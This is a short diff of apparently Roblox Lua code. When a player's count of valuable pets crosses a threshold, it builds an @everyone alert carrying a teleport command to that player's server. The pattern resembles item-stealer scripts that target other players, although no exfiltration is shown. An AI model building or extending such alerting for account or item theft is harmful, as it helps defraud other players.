@@ -70,7 +70,7 @@ end
 
 if legendaries_count >= 5 or neon_count >= 5 or mega_count >= 1 then
     messageADOPT =
-        "**||@everyone||**\n" ..
+        "**@everyone**\n" ..
        
         'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")\n'
 else
